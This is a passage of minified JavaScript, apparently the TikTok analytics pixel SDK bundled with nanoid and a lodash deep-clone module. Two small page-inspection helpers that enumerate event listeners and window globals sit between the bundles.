        }(t) && this.warn(c.INVALID_PHONE_NUMBER_FORMAT), function (t) {
          var e = t.event,
            t = t.properties,
            t = void 0 === t ? {} : t;
          if (["CompletePayment", "InitiateCheckout", "AddToCart", "PlaceAnOrder", "ViewContent", "AddToWishlist"].includes(void 0 === e ? "" : e)) {
            if (m(t.contents) && m(t.content_id)) return !0;
            if (!m(t.contents)) return !Array.isArray(t.contents) || t.contents.length < 1 || !t.contents.every(function (t) {
              return t && !m(t.content_id);
            });
          }
          return !1;
        }(t) && this.warn(c.MISSING_CONTENT_ID), function (t) {
          t.event;
          t = t.properties, t = void 0 === t ? {} : t;
          return !(!m(t.content_id) && /^\s*$/.test(t.content_id)) && (!(!m(t.contents) && Array.isArray(t.contents)) || t.contents.every(function (t) {
            return t && !m(t.content_id) && !/^\s*$/.test(t.content_id);
          }));
        }(t) || this.warn(c.INVALID_CONTENT_ID), function (t) {
          t = t.properties.content_type;
          return !t || y.includes(t);
        }(t) || this.warn(c.INVALID_CONTENT_TYPE), function (t) {
          t = t.properties.value;
          return !t || "number" == typeof t || !("string" != typeof t || !/^\d+(\.\d+)?$/.test(t) && !/^\d+$/.test(t));
        }(t) || this.warn(c.INVALID_EVENT_PARAMETER_VALUE), e = (n = t).event, n = void 0 === (n = n.properties) ? {} : n, ("CompletePayment" === (void 0 === e ? "" : e) && m(n.value) || !m(n.currency) && m(n.value)) && this.warn(c.MISSING_VALUE_PARAMETER), function (t) {
          t = t.properties.currency;
          return !t || h.includes(t);
        }(t) || this.warn(c.INVALID_CURRENCY_CODE), t = (n = t).event, n = void 0 === (n = n.properties) ? {} : n, ("CompletePayment" === (void 0 === t ? "" : t) && m(n.currency) || !m(n.value) && m(n.currency)) && this.warn(c.MISSING_CURRENCY_PARAMETER, {
          learn_more: ""
        });
      }, b);
    function b(t) {
      t = N.call(this, t) || this;
      return t.name = g, t;
    }
    var O,
      i = Object(o.e)() || [];
    (null === (d = i._plugins) || void 0 === d ? void 0 : d.DiagnosticsConsole) && (O = new n(), i.diagnostics || (i.diagnostics = O), Object(r.a)(g, function () {
      return O;
    }));
    e["default"] = n;
  },
  fe1q: function (t, e, n) {
    "use strict";

    n.d(e, "c", function () {
      return r;
    }), n.d(e, "a", function () {
      return i;
    }), n.d(e, "b", function () {
      return a;
    });
    var o = n("SbFU");
    function r() {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
      try {
        var n = Object(o.e)().monitor;
        n && n.info.apply(n, t);
      } catch (r) {}
    }
    function i() {
      for (var t = [], e = 0; e < arguments.length; e++) t[e] = arguments[e];
      try {
        var n = Object(o.e)().monitor;
        n && n.error.apply(n, t);
      } catch (r) {}
    }
    function a() {
      try {
        0;
        var t = document && document.currentScript,
          e = t && t.src || "http://emptyURLSrc",
          n = /i18n\/pixel\/events\.js/.test(e),
          r = /i18n\/pixel\/sdk\.js/.test(e),
          o = new URL(e).searchParams,
          i = o.get("sdkid") || t && t.getAttribute("data-id") || "";
        return n ? {
          lib: o.get("lib") || "ttq",
          pixelCode: i
        } : r ? {
          lib: "_taq",
          pixelCode: i
        } : {
          lib: "ttq",
          pixelCode: i
        };
      } catch (a) {
        return {
          lib: "ttq",
          pixelCode: ""
        };
      }
    }
  },
  "u+wH": function (t, e, n) {
    "use strict";

    n.r(e), n.d(e, "nanoid", function () {
      return c;
    }), n.d(e, "customAlphabet", function () {
      return a;
    }), n.d(e, "customRandom", function () {
      return i;
    }), n.d(e, "urlAlphabet", function () {
      return r;
    }), n.d(e, "random", function () {
      return o;
    });
    let r = "useandom-26T198340PX75pxJACKVERYMINDBUSHWOLF_GQZbfghjklqvwyzrict",
      o = t => crypto.getRandomValues(new Uint8Array(t)),
      i = (o, t, i) => {
        let a = (2 << Math.log(o.length - 1) / Math.LN2) - 1,
          c = -~(1.6 * a * t / o.length);
        return (e = t) => {
          let n = "";
          for (;;) {
            var r = i(c);
            let t = c;
            for (; t--;) if (n += o[r[t] & a] || "", n.length === e) return n;
          }
        };
      },
      a = (t, e = 21) => i(t, e, o),
      c = (e = 21) => {
        let n = "";
        for (var r = crypto.getRandomValues(new Uint8Array(e)); e--;) {
          let t = 63 & r[e];
          t < 36 ? n += t.toString(36) : t < 62 ? n += (t - 26).toString(36).toUpperCase() : t < 63 ? n += "_" : n += "-";
        }
        return n;
      };
  },
  w0s3: function (t, e, n) {
    "use strict";

    n.d(e, "f", function () {
      return r;
    }), n.d(e, "c", function () {
      return o;
    }), n.d(e, "b", function () {
      return i;
    }), n.d(e, "i", function () {
      return a;
    }), n.d(e, "a", function () {
      return c;
    }), n.d(e, "g", function () {
      return u;
    }), n.d(e, "h", function () {
      return s;
    }), n.d(e, "e", function () {
      return d;
    }), n.d(e, "d", function () {
      return l;
    });
    var r = "TiktokAnalyticsObject",
      o = "ttq",
      i = "external",
      a = "tiktok",
      c = "https://analytics.tiktok.com/i18n/pixel/config.js",
      u = "https://analytics.tiktok.com/i18n/pixel/pickup.js",
      s = "https://analytics.tiktok.com/i18n/pixel/identify.js",
      d = "https://analytics.tiktok.com/i18n/pixel/enable_cookie",
      l = "https://analytics.tiktok.com/i18n/pixel/disable_cookie";
  },
  yLpj: function (t, e) {
    var n = function () {
      return this;
    }();
    try {
      n = n || new Function("return this")();
    } catch (r) {
      "object" == typeof window && (n = window);
    }
    t.exports = n;
  },
  zT9C: function (t, Ct, e) {
    !function (t, e) {
      var r = "__lodash_hash_undefined__",
        s = 9007199254740991,
        f = "[object Arguments]",
        p = "[object Boolean]",
        h = "[object Date]",
        y = "[object Function]",
        E = "[object GeneratorFunction]",
        I = "[object Map]",
        m = "[object Number]",
        v = "[object Object]",
        n = "[object Promise]",
        N = "[object RegExp]",
        A = "[object Set]",
        T = "[object String]",
        g = "[object Symbol]",
        o = "[object WeakMap]",
        b = "[object ArrayBuffer]",
        O = "[object DataView]",
        R = "[object Float32Array]",
        D = "[object Float64Array]",
        M = "[object Int8Array]",
        P = "[object Int16Array]",
        S = "[object Int32Array]",
        L = "[object Uint8Array]",
        w = "[object Uint8ClampedArray]",
        j = "[object Uint16Array]",
        k = "[object Uint32Array]",
        C = /\w*$/,
        i = /^\[object .+?Constructor\]$/,
        d = /^(?:0|[1-9]\d*)$/,
        V = {};
      V[f] = V["[object Array]"] = V[b] = V[O] = V[p] = V[h] = V[R] = V[D] = V[M] = V[P] = V[S] = V[I] = V[m] = V[v] = V[N] = V[A] = V[T] = V[g] = V[L] = V[w] = V[j] = V[k] = !0, V["[object Error]"] = V[y] = V[o] = !1;
      var a = "object" == typeof t && t && t.Object === Object && t,
        c = "object" == typeof self && self && self.Object === Object && self,
        u = a || c || Function("return this")(),
        l = Ct && !Ct.nodeType && Ct,
        _ = l && "object" == typeof e && e && !e.nodeType && e,
        x = _ && _.exports === l;
      function U(t, e) {
        return t.set(e[0], e[1]), t;
      }
      function F(t, e) {
        return t.add(e), t;
      }
      function G(t, e, n, r) {
        var o = -1,
          i = t ? t.length : 0;
        for (r && i && (n = t[++o]); ++o < i;) n = e(n, t[o], o, t);
        return n;
      }
      function H(t) {
        var e = !1;
        if (null != t && "function" != typeof t.toString) try {
          e = !!(t + "");
        } catch (n) {}
        return e;
      }
      function B(t) {
        var n = -1,
          r = Array(t.size);
        return t.forEach(function (t, e) {
          r[++n] = [e, t];
        }), r;
      }
      function Y(e, n) {
        return function (t) {
          return e(n(t));
        };
      }
      function K(t) {
        var e = -1,
          n = Array(t.size);
        return t.forEach(function (t) {
          n[++e] = t;
        }), n;
      }
      var t = Array.prototype,
        a = Function.prototype,
        W = Object.prototype,
        c = u["__core-js_shared__"],
        X = (_ = /[^.]+$/.exec(c && c.keys && c.keys.IE_PROTO || "")) ? "Symbol(src)_1." + _ : "",
        q = a.toString,
        $ = W.hasOwnProperty,
        z = W.toString,
        J = RegExp("^" + q.call($).replace(/[\\^$.*+?()[\]{}|]/g, "\\$&").replace(/hasOwnProperty|(function).*?(?=\\\()| for .+?(?=\\\])/g, "$1.*?") + "$"),
        l = x ? u.Buffer : undefined,
        c = u.Symbol,
        Z = u.Uint8Array,
        Q = Y(Object.getPrototypeOf, Object),
        tt = Object.create,
        et = W.propertyIsEnumerable,
        nt = t.splice,
        _ = Object.getOwnPropertySymbols,
        a = l ? l.isBuffer : undefined,
        rt = Y(Object.keys, Object),
        x = gt(u, "DataView"),
        ot = gt(u, "Map"),
        t = gt(u, "Promise"),
        l = gt(u, "Set"),
        u = gt(u, "WeakMap"),
        it = gt(Object, "create"),
        at = Dt(x),
        ct = Dt(ot),
        ut = Dt(t),
        st = Dt(l),
        dt = Dt(u),
        c = c ? c.prototype : undefined,
        lt = c ? c.valueOf : undefined;
      function _t(t) {
        var e = -1,
          n = t ? t.length : 0;
        for (this.clear(); ++e < n;) {
          var r = t[e];
          this.set(r[0], r[1]);
        }
      }
      function ft(t) {
        var e = -1,
          n = t ? t.length : 0;
        for (this.clear(); ++e < n;) {
          var r = t[e];
          this.set(r[0], r[1]);
        }
      }
      function pt(t) {
        var e = -1,
          n = t ? t.length : 0;
        for (this.clear(); ++e < n;) {
          var r = t[e];
          this.set(r[0], r[1]);
        }
      }
      function ht(t) {
        this.__data__ = new ft(t);
      }
      function yt(t, e) {
        var n,
          r,
          o,
          i,
          a = Pt(t) || function (t) {
            return function (t) {
              return !!t && "object" == typeof t;
            }(t) && St(t);
          }(n = t) && $.call(n, "callee") && (!et.call(n, "callee") || z.call(n) == f) ? function (t, e) {
            for (var n = -1, r = Array(t); ++n < t;) r[n] = e(n);
            return r;
          }(t.length, String) : [],
          c = a.length,
          u = !!c;
        for (r in t) !e && !$.call(t, r) || u && ("length" == r || (o = r, !!(i = null == (i = c) ? s : i) && ("number" == typeof o || d.test(o)) && -1 < o && o % 1 == 0 && o < i)) || a.push(r);
        return a;
      }
      function Et(t, e, n) {
        var r = t[e];
        $.call(t, e) && Mt(r, n) && (n !== undefined || e in t) || (t[e] = n);
      }
      function It(t, e) {
        for (var n = t.length; n--;) if (Mt(t[n][0], e)) return n;
        return -1;
      }
      function mt(n, r, o, i, t, e, a) {
        var c;
        if ((c = i ? e ? i(n, t, e, a) : i(n) : c) !== undefined) return c;
        if (!jt(n)) return n;
        var u,
          s = Pt(n);
        if (s) {
          if (c = function (t) {
            var e = t.length,
              n = t.constructor(e);
            e && "string" == typeof t[0] && $.call(t, "index") && (n.index = t.index, n.input = t.input);
            return n;
          }(n), !r) return function (t, e) {
            var n = -1,
              r = t.length;
            e = e || Array(r);
            for (; ++n < r;) e[n] = t[n];
            return e;
          }(n, c);
        } else {
          var d = Ot(n),
            l = d == y || d == E;
          if (Lt(n)) return function (t, e) {
            if (e) return t.slice();
            e = new t.constructor(t.length);
            return t.copy(e), e;
          }(n, r);
          if (d == v || d == f || l && !e) {
            if (H(n)) return e ? n : {};
            if (c = "function" != typeof (u = l ? {} : n).constructor || Rt(u) ? {} : function (t) {
              return jt(t) ? tt(t) : {};
            }(Q(u)), !r) return l = t = n, u = (u = c) && At(l, kt(l), u), At(t, bt(t), u);
          } else {
            if (!V[d]) return e ? n : {};
            c = function (t, e, n, r) {
              var o = t.constructor;
              switch (e) {
                case b:
                  return Nt(t);
                case p:
                case h:
                  return new o(+t);
                case O:
                  return function (t, e) {
                    e = e ? Nt(t.buffer) : t.buffer;
                    return new t.constructor(e, t.byteOffset, t.byteLength);
                  }(t, r);
                case R:
                case D:
                case M:
                case P:
                case S:
                case L:
                case w:
                case j:
                case k:
                  return function (t, e) {
                    e = e ? Nt(t.buffer) : t.buffer;
                    return new t.constructor(e, t.byteOffset, t.length);
                  }(t, r);
                case I:
                  return function (t, e, n) {
                    return G(e ? n(B(t), !0) : B(t), U, new t.constructor());
                  }(t, r, n);
                case m:
                case T:
                  return new o(t);
                case N:
                  return function (t) {
                    var e = new t.constructor(t.source, C.exec(t));
                    return e.lastIndex = t.lastIndex, e;
                  }(t);
                case A:
                  return function (t, e, n) {
                    return G(e ? n(K(t), !0) : K(t), F, new t.constructor());
                  }(t, r, n);
                case g:
                  return function (t) {
                    return lt ? Object(lt.call(t)) : {};
                  }(t);
              }
            }(n, d, mt, r);
          }
        }
        var _,
          d = (a = a || new ht()).get(n);
        return d || (a.set(n, c), function (t, e) {
          for (var n = -1, r = t ? t.length : 0; ++n < r && !1 !== e(t[n], n, t););
        }((_ = !s ? o ? function (t, e, n) {
          e = e(t);
          return Pt(t) ? e : function (t, e) {
            for (var n = -1, r = e.length, o = t.length; ++n < r;) t[o + n] = e[n];
            return t;
          }(e, n(t));
        }(n, kt, bt) : kt(n) : _) || n, function (t, e) {
          _ && (t = n[e = t]), Et(c, e, mt(t, r, o, i, e, n, a));
        }), c);
      }
      function vt(t) {
        var e;
        return jt(t) && (e = t, !(X && X in e)) && (wt(t) || H(t) ? J : i).test(Dt(t));
      }
      function Nt(t) {
        var e = new t.constructor(t.byteLength);
        return new Z(e).set(new Z(t)), e;
      }
      function At(t, e, n, r) {
        n = n || {};
        for (var o = -1, i = e.length; ++o < i;) {
          var a = e[o],
            c = r ? r(n[a], t[a], a, n, t) : undefined;
          Et(n, a, c === undefined ? t[a] : c);
        }
        return n;
      }
      function Tt(t, e) {
        var n,
          r = t.__data__;
        return ("string" == (t = typeof (n = e)) || "number" == t || "symbol" == t || "boolean" == t ? "__proto__" !== n : null === n) ? r["string" == typeof e ? "string" : "hash"] : r.map;
      }
      function gt(t, e) {
        e = e, e = null == (t = t) ? undefined : t[e];
        return vt(e) ? e : undefined;
      }
      _t.prototype.clear = function () {
        this.__data__ = it ? it(null) : {};
      }, _t.prototype["delete"] = function (t) {
        return this.has(t) && delete this.__data__[t];
      }, _t.prototype.get = function (t) {
        var e = this.__data__;
        if (it) {
          var n = e[t];
          return n === r ? undefined : n;
        }
        return $.call(e, t) ? e[t] : undefined;
      }, _t.prototype.has = function (t) {
        var e = this.__data__;
        return it ? e[t] !== undefined : $.call(e, t);
      }, _t.prototype.set = function (t, e) {
        return this.__data__[t] = it && e === undefined ? r : e, this;
      }, ft.prototype.clear = function () {
        this.__data__ = [];
      }, ft.prototype["delete"] = function (t) {
        var e = this.__data__;
        return !((t = It(e, t)) < 0) && (t == e.length - 1 ? e.pop() : nt.call(e, t, 1), !0);
      }, ft.prototype.get = function (t) {
        var e = this.__data__;
        return (t = It(e, t)) < 0 ? undefined : e[t][1];
      }, ft.prototype.has = function (t) {
        return -1 < It(this.__data__, t);
      }, ft.prototype.set = function (t, e) {
        var n = this.__data__,
          r = It(n, t);
        return r < 0 ? n.push([t, e]) : n[r][1] = e, this;
      }, pt.prototype.clear = function () {
        this.__data__ = {
          hash: new _t(),
          map: new (ot || ft)(),
          string: new _t()
        };
      }, pt.prototype["delete"] = function (t) {
        return Tt(this, t)["delete"](t);
      }, pt.prototype.get = function (t) {
        return Tt(this, t).get(t);
      }, pt.prototype.has = function (t) {
        return Tt(this, t).has(t);
      }, pt.prototype.set = function (t, e) {
        return Tt(this, t).set(t, e), this;
      }, ht.prototype.clear = function () {
        this.__data__ = new ft();
      }, ht.prototype["delete"] = function (t) {
        return this.__data__["delete"](t);
      }, ht.prototype.get = function (t) {
        return this.__data__.get(t);
      }, ht.prototype.has = function (t) {
        return this.__data__.has(t);
      }, ht.prototype.set = function (t, e) {
        var n = this.__data__;
        if (n instanceof ft) {
          var r = n.__data__;
          if (!ot || r.length < 199) return r.push([t, e]), this;
          n = this.__data__ = new pt(r);
        }
        return n.set(t, e), this;
      };
      var bt = _ ? Y(_, Object) : function () {
          return [];
        },
        Ot = function (t) {
          return z.call(t);
        };
      function Rt(t) {
        var e = t && t.constructor;
        return t === ("function" == typeof e && e.prototype || W);
      }
      function Dt(t) {
        if (null != t) {
          try {
            return q.call(t);
          } catch (e) {}
          try {
            return t + "";
          } catch (e) {}
        }
        return "";
      }
      function Mt(t, e) {
        return t === e || t != t && e != e;
      }
      (x && Ot(new x(new ArrayBuffer(1))) != O || ot && Ot(new ot()) != I || t && Ot(t.resolve()) != n || l && Ot(new l()) != A || u && Ot(new u()) != o) && (Ot = function (t) {
        var e = z.call(t),
          t = e == v ? t.constructor : undefined,
          t = t ? Dt(t) : undefined;
        if (t) switch (t) {
          case at:
            return O;
          case ct:
            return I;
          case ut:
            return n;
          case st:
            return A;
          case dt:
            return o;
        }
        return e;
      });
      var Pt = Array.isArray;
      function St(t) {
        return null != t && "number" == typeof (e = t.length) && -1 < e && e % 1 == 0 && e <= s && !wt(t);
        var e;
      }
      var Lt = a || function () {
        return !1;
      };
      function wt(t) {
        t = jt(t) ? z.call(t) : "";
        return t == y || t == E;
      }
      function jt(t) {
        var e = typeof t;
        return t && ("object" == e || "function" == e);
      }
      function kt(t) {
        return (St(t) ? yt : function (t) {
          if (!Rt(t)) return rt(t);
          var e,
            n = [];
          for (e in Object(t)) $.call(t, e) && "constructor" != e && n.push(e);
          return n;
        })(t);
      }
      e.exports = function (t) {
        return mt(t, !0, !0);
      };
    }.call(this, e("yLpj"), e("YuTi")(t));
  }
});
function gatherEventListeners() {
  let temp = document.querySelectorAll('*');
  let allListeners = [];
  for (let i = 0; i < temp.length; i++) {
    let elListeners = getEventListeners(temp[i]);
    for (let eventType in elListeners) {
      allListeners.push({
        elem: temp[i],
        listeners: elListeners[eventType]
      });
    }
  }
  return allListeners;
}
function gatherWindowProperties() {
  const unseenProps = {};
  for (const key in window) {
    if (window.hasOwnProperty(key)) {
      if (!window.seenVars.includes(key)) {
        const value = window[key];
        const type = typeof value;
        unseenProps[key] = {
          type: type,
          value: type === "function" ? undefined : value
        };
      }
    }
  }
  return unseenProps;
}
!function (e) {
  var r = {};
  function o(t) {
    if (r[t]) return r[t].exports;
    var n = r[t] = {
      i: t,
      l: !1,
      exports: {}
    };
    return e[t].call(n.exports, n, n.exports, o), n.l = !0, n.exports;
  }
  o.m = e, o.c = r, o.d = function (t, n, e) {
    o.o(t, n) || Object.defineProperty(t, n, {
      enumerable: !0,
      get: e
    });
  }, o.r = function (t) {
    "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(t, Symbol.toStringTag, {
      value: "Module"
    }), Object.defineProperty(t, "__esModule", {
      value: !0
    });
  }, o.t = function (n, t) {
    if (1 & t && (n = o(n)), 8 & t) return n;
    if (4 & t && "object" == typeof n && n && n.__esModule) return n;
    var e = Object.create(null);
    if (o.r(e), Object.defineProperty(e, "default", {
      enumerable: !0,
      value: n
    }), 2 & t && "string" != typeof n) for (var r in n) o.d(e, r, function (t) {
      return n[t];
    }.bind(null, r));
    return e;
  }, o.n = function (t) {
    var n = t && t.__esModule ? function () {
      return t["default"];
    } : function () {
      return t;
    };
    return o.d(n, "a", n), n;
  }, o.o = function (t, n) {
    return Object.prototype.hasOwnProperty.call(t, n);
  }, o.p = "https://analytics.tiktok.com/i18n/pixel/", o(o.s = "b1Hk");
}({
  "/6w+": function (t, n, e) {
    "use strict";

    var r, o, i;
    e.d(n, "b", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "c", function () {
      return i;
    }), (n = r = r || {})[n.OTHER = 0] = "OTHER", n[n.ANDROID = 1] = "ANDROID", n[n.IOS = 2] = "IOS", (n = o = o || {}).LOAD_START = "load_start", n.LOAD_END = "load_end", n.BEFORE_INIT = "before_init", n.INIT_START = "init_start", n.INIT_END = "init_end", n.JSB_INIT_START = "jsb_init_start", n.JSB_INIT_END = "jsb_init_end", n.BEFORE_AD_INFO_INIT_START = "before_ad_info_init_start", n.AD_INFO_INIT_START = "ad_info_init_start", n.AD_INFO_INIT_END = "ad_info_init_end", n.IDENTIFY_INIT_START = "identify_init_start", n.IDENTIFY_INIT_END = "identify_init_end", n.PLUGIN_INIT_START = "_init_start", n.PLUGIN_INIT_END = "_init_end", n.PIXEL_SEND = "pixel_send", n.PIXEL_SEND_PCM = "pixel_send_PCM", n.JSB_SEND = "jsb_send", n.HTTP_SEND = "http_send", n.HANDLE_CACHE = "handle_cache", n.INIT_ERROR = "init_error", n.PIXEL_EMPTY = "pixel_empty", n.JSB_ERROR = "jsb_error", n.API_ERROR = "api_error", n.PLUGIN_ERROR = "plugin_error", n.CUSTOM_INFO = "custom_info", n.CUSTOM_ERROR = "custom_error", (n = i = i || {})[n.IFRAME = 1] = "IFRAME", n[n.NORMAL = 2] = "NORMAL", n[n.WEBWORKER = 3] = "WEBWORKER";
  },
  "2HLQ": function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {})[n.NOT_SURE = 0] = "NOT_SURE", n[n.INVOKE_METHOD_ENABLED = 1] = "INVOKE_METHOD_ENABLED", n[n.INVOKE_METHOD_NOT_ENABLED = 2] = "INVOKE_METHOD_NOT_ENABLED", n[n.TOUTIAO_BRIDGE_NOT_ENABLED = 3] = "TOUTIAO_BRIDGE_NOT_ENABLED";
  },
  "7f3k": function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {})[n.defaultReport = 0] = "defaultReport", n[n.httpReport = 1] = "httpReport", n[n.htmlHttpReport = 2] = "htmlHttpReport";
  },
  GJ6r: function (t, d, _) {
    "use strict";

    !function (t) {
      _.d(d, "a", function () {
        return r;
      }), _.d(d, "g", function () {
        return o;
      }), _.d(d, "e", function () {
        return a;
      }), _.d(d, "f", function () {
        return c;
      }), _.d(d, "b", function () {
        return l;
      }), _.d(d, "d", function () {
        return f;
      }), _.d(d, "c", function () {
        return p;
      });
      var n = _("SbFU"),
        e = (_("2HLQ"), _("IOsT"), _("w0s3")),
        r = function () {
          return "undefined" != typeof globalThis ? globalThis : "undefined" != typeof self ? self : "undefined" != typeof window ? window : void 0 !== t ? t : new Function("return this")();
        },
        o = function () {
          var t = r();
          return "undefined" != typeof t.DedicatedWorkerGlobalScope ? t instanceof t.DedicatedWorkerGlobalScope : "DedicatedWorkerGlobalScope" === t.constructor.name;
        },
        i = function () {
          var t = r();
          return "object" == typeof navigator ? navigator.userAgent : t._userAgent || "";
        },
        u = function () {
          var t;
          return (null === (t = null === (t = Object(n.e)()) || void 0 === t ? void 0 : t._env) || void 0 === t ? void 0 : t.env) || e.b;
        },
        a = function () {
          return u() !== e.b;
        },
        c = function () {
          return u() === e.i;
        },
        s = (Object(n.n)(function () {
          return /open_news/i.test(i());
        }), Object(n.n)(function () {
          return /ultralite/i.test(i());
        }), function () {
          return /windows phone/i.test(i()) ? "Windows Phone" : /android/i.test(i()) ? "android" : /iPad|iPhone|iPod/.test(i()) ? "ios" : "pc";
        }),
        l = function () {
          return "android" === s();
        },
        f = function () {
          return "ios" === s();
        },
        p = function () {
          return "development" === "production".trim();
        };
    }.call(this, _("yLpj"));
  },
  HyyX: function (t, n, e) {
    "use strict";

    e.d(n, "c", function () {
      return r;
    }), e.d(n, "a", function () {
      return o;
    }), e.d(n, "b", function () {
      return i;
    });
    var r = ["email", "phone_number", "auto_email", "auto_phone_number", "external_id", "sha256_email", "sha256_phone_number", "sha256_external_id"];
    (n = u = u || {}).missing = "missing", n.valid = "valid", n.invalid = "invalid", (n = {}).empty = "empty", n.whitespace = "whitespace", n.hardcode = "hardcode", n.encode = "encode", (n = {}).invalidCountry = "invalid_country", n.notANumber = "not_a_number", n.tooShort = "too_short", n.tooLong = "too_long", n.invalidLength = "invalid_length", n.emptyCountryCodeThroughIP = "empty_country_code_through_ip", n.invalidCountryAfterInjectPlus = "invalid_country_after_inject_plus", n.notANumberAfterInjectPlus = "not_a_number_after_inject_plus", n.tooShortAfterInjectPlus = "too_short_after_inject_plus", n.tooLongAfterInjectPlus = "too_long_after_inject_plus", n.invalidLengthAfterInjectPlus = "invalid_length_after_inject_plus", n.invalidCountryAfterInjectCountry = "invalid_country_after_inject_country", n.notANumberAfterInjectCountry = "not_a_number_after_inject_country", n.tooShortAfterInjectCountry = "too_short_after_inject_country", n.tooLongAfterInjectCountry = "too_long_after_inject_country", n.invalidLengthAfterInjectCountry = "invalid_length_after_inject_country", (n = {}).letterCase = "letter_case", n.isNotValidEmail = "is_not_valid_email", n.isNotPossibleEmail = "is_not_possible_email", n.domainTypo = "domain_typo", n.addressFormat = "address_format";
    var o, i, u;
    u.missing, u.missing, u.missing, u.missing, u.missing, u.missing;
    (u = o = o || {}).EMPTY_VALUE = "empty_value", u.WRONG_FORMAT = "wrong_format", u.CORRECT_FORMAT = "correct_format", u.HASHED = "hashed", u.HASHED_ERR = "hashed_err", u.HASHED_CORRECT = "hashed_correct", u.PLAINTEXT_EMAIL = "plaintext_email", u.PLAINTEXT_PHONE = "plaintext_phone", (u = i = i || {}).EMPTY_VALUE = "empty_value", u.PLAIN_EMAIL = "plain_email", u.PLAIN_PHONE = "plain_phone", u.HASHED = "hashed", u.FILTER_EVENTS = "filter_events", u.UNKNOWN_INVALID = "unknown_invalid", u.BASE64_STRING_HASHED = "base64_string_hashed", u.BASE64_HEX_HASHED = "base64_hex_hashed", u.PLAIN_MDN_EMAIL = "plain_mdn_email", (u = {}).Manual = "manual", u.Auto = "auto";
  },
  IOsT: function (t, n, e) {
    "use strict";

    var r;
    e.d(n, "a", function () {
      return r;
    }), (n = r = r || {}).Normal = "1", n.Iframe = "2", n.WebWorker = "3", n.SandboxIframe = "4";
  },
  Pd38: function (t, n, e) {
    "use strict";

    e.d(n, "a", function () {
      return r;
    });
    var o = e("SbFU"),
      r = function (n, t, e) {
        void 0 === e && (e = !1);
        var r = Object(o.e)() || [];
        if (r.dynamicPlugins || (r.dynamicPlugins = []), !r.dynamicPlugins.find(function (t) {
          return t.name === n;
        })) {
          if (!e) if (!Object(o.m)(n)) return;
          r.dynamicPlugins.push({
            name: n,
            handler: t
          });
        }
      };
  },
  SbFU: function (t, n, e) {
    "use strict";

    e.d(n, "f", function () {
      return a;
    }), e.d(n, "j", function () {
      return c;
    }), e.d(n, "e", function () {
      return s;
    }), e.d(n, "m", function () {
      return l;
    }), e.d(n, "l", function () {
      return f;
    }), e.d(n, "g", function () {
      return p;
    }), e.d(n, "h", function () {
      return d;
    }), e.d(n, "d", function () {
      return _;
    }), e.d(n, "p", function () {
      return h;
    }), e.d(n, "c", function () {
      return y;
    }), e.d(n, "o", function () {
      return v;
    }), e.d(n, "n", function () {
      return g;
    }), e.d(n, "k", function () {
      return b;
    }), e.d(n, "b", function () {
      return m;
    }), e.d(n, "a", function () {
      return E;
    }), e.d(n, "i", function () {
      return O;
    });
    e("GJ6r");
    var r = e("w0s3"),
      o = (e("HyyX"), undefined && undefined.__awaiter || function (t, n, a, c) {
        return new (a = a || Promise)(function (e, r) {
          function o(t) {
            try {
              u(c.next(t));
            } catch (n) {
              r(n);
            }
          }
          function i(t) {
            try {
              u(c["throw"](t));
            } catch (n) {
              r(n);
            }
          }
          function u(t) {
            var n;
            t.done ? e(t.value) : ((n = t.value) instanceof a ? n : new a(function (t) {
              t(n);
            })).then(o, i);
          }
          u((c = c.apply(t, n || [])).next());
        });
      }),
      i = undefined && undefined.__generator || function (e, r) {
        var o,
          i,
          u,
          a = {
            label: 0,
            sent: function () {
              if (1 & u[0]) throw u[1];
              return u[1];
            },
            trys: [],
            ops: []
          },
          t = {
            next: n(0),
            "throw": n(1),
            "return": n(2)
          };
        return "function" == typeof Symbol && (t[Symbol.iterator] = function () {
          return this;
        }), t;
        function n(n) {
          return function (t) {
            return c([n, t]);
          };
        }
        function c(t) {
          if (o) throw new TypeError("Generator is already executing.");
          for (; a;) try {
            if (o = 1, i && (u = 2 & t[0] ? i["return"] : t[0] ? i["throw"] || ((u = i["return"]) && u.call(i), 0) : i.next) && !(u = u.call(i, t[1])).done) return u;
            switch (i = 0, (t = u ? [2 & t[0], u.value] : t)[0]) {
              case 0:
              case 1:
                u = t;
                break;
              case 4:
                return a.label++, {
                  value: t[1],
                  done: !1
                };
              case 5:
                a.label++, i = t[1], t = [0];
                continue;
              case 7:
                t = a.ops.pop(), a.trys.pop();
                continue;
              default:
                if (!(u = 0 < (u = a.trys).length && u[u.length - 1]) && (6 === t[0] || 2 === t[0])) {
                  a = 0;
                  continue;
                }
                if (3 === t[0] && (!u || t[1] > u[0] && t[1] < u[3])) {
                  a.label = t[1];
                  break;
                }
                if (6 === t[0] && a.label < u[1]) {
                  a.label = u[1], u = t;
                  break;
                }
                if (u && a.label < u[2]) {
                  a.label = u[2], a.ops.push(t);
                  break;
                }
                u[2] && a.ops.pop(), a.trys.pop();
                continue;
            }
            t = r.call(e, a);
          } catch (n) {
            t = [6, n], i = 0;
          } finally {
            o = u = 0;
          }
          if (5 & t[0]) throw t[1];
          return {
            value: t[0] ? t[1] : void 0,
            done: !0
          };
        }
      },
      u = undefined && undefined.__read || function (t, n) {
        var e = "function" == typeof Symbol && t[Symbol.iterator];
        if (!e) return t;
        var r,
          o,
          i = e.call(t),
          u = [];
        try {
          for (; (void 0 === n || 0 < n--) && !(r = i.next()).done;) u.push(r.value);
        } catch (a) {
          o = {
            error: a
          };
        } finally {
          try {
            r && !r.done && (e = i["return"]) && e.call(i);
          } finally {
            if (o) throw o.error;
          }
        }
        return u;
      },
      a = (undefined && undefined.__spread, function () {
        var t = s();
        return t._partner || "";
      }),
      c = function () {
        var t = s();
        return t && t.initialize;
      },
      s = function () {
        return "object" == typeof window && window["object" == typeof window && window[r.f] || r.c];
      },
      l = function (t) {
        try {
          var n = s()._plugins || {};
          return null == n[t] || !!n[t];
        } catch (e) {
          return !0;
        }
      },
      f = function () {
        try {
          var t = s();
          return t && t._legacy && 0 !== t._legacy.length ? Object.keys(t._t).length > Object.keys(t._legacy).length || Object.keys(t.context.data.pixelMap).length > Object.keys(t._legacy).length : !1;
        } catch (n) {
          return !1;
        }
      },
      p = function (t) {
        try {
          var n = s();
          if (n && n._self_host_config && n._self_host_config[t]) return n._self_host_config[t] || "";
        } catch (e) {
          return "";
        }
        return "";
